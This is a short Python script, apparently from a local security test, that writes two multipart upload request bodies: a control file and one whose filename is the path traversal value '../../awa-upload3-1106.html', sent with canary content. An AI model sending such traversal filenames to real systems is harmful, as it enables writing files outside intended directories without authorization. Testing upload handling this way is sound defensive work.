import os
work = r'D:\Backup\Downloads\awa-ddd\work\local-8081-20261106'
boundary = '----AWAUPLOAD1106'
content = b'AWA-PATH-CANARY-1106'
for fname, out in [('awa-path-control-1106.png', 'upload_path_control.bin'), ('../../awa-upload3-1106.html', 'upload_path_traversal.bin')]:
    parts = []
    parts.append(('--' + boundary + '\r\n').encode())
    parts.append(('Content-Disposition: form-data; name="file"; filename="%s"\r\n' % fname).encode())
    parts.append(b'Content-Type: image/png\r\n\r\n')
    parts.append(content)
    parts.append(('\r\n--' + boundary + '--\r\n').encode())
    open(os.path.join(work, out), 'wb').write(b''.join(parts))
    print(out, fname, len(b''.join(parts)))
